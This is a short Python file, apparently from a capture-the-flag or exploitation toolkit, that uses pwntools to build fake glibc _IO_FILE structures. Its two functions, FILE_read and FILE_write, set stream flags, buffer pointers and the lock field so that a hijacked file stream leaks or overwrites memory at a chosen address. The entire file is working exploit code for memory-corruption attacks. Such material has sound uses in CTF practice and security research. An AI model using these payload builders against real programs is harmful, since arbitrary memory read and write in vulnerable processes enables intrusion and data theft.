from pwn import FileStructure


def FILE_read(target_addr: int, size: int, buf_addr: int):
    """
    - input : `target_addr (int)`, `size (int)`, `buf_addr (int)` , `buf_addr + 8` is a valid address
    - output : `payload (bytes)` , payload of fake `struct _IO_FILE`
    """

    f = FileStructure()
    f.flags, f.fileno = 0xFBAD0800, 1
    f._IO_write_base, f._IO_write_ptr, f._IO_write_end = target_addr, target_addr + size, 0
    f._IO_read_end = target_addr
    f._lock = buf_addr

    return bytes(f)[:-8]



def FILE_write(target_addr: int, size: int, buf_addr: int):
    """
    - input : `target_addr (int)`, `size (int)`, `buf_addsr (int)` , `size` must bigger than `fread`'s size & `buf_addr + 8` is a valid address
    - output : `payload (bytes)` , payload of fake `struct _IO_FILE`
    """

    f = FileStructure()
    f.flags, f.fileno = 0xFBAD0000, 0
    f._IO_read_ptr = f._IO_read_end = 0
    f._IO_buf_base, f._IO_buf_end = target_addr, target_addr + size
    f._lock = buf_addr

    return bytes(f)[:-8]

